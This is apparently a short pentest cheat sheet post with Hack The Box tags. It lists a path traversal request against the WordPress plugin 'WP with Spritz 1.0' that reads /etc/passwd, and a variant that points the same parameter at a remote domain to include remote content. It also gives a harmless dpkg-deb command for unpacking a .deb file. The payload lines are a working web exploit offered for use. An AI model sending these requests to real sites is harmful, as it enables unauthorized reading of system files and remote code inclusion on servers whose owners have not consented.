---
title: "Weird Cheat Sheets"
categories:
  - Pentest
  - Ethical Hacking
tags:
  - HTB
  - Cheatsheets
  - Pentest
  - Windows
  - Linux
  - Random stuff
---


# Lets glow 🚀
WordPress Plugin WP with Spritz 1.0 LFI
```
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
```

Extract the files inside .deb package without installing them in the newfolder that we created
```
mkdir newfolder
dpkg-deb -xv debfile.deb newfolder
```
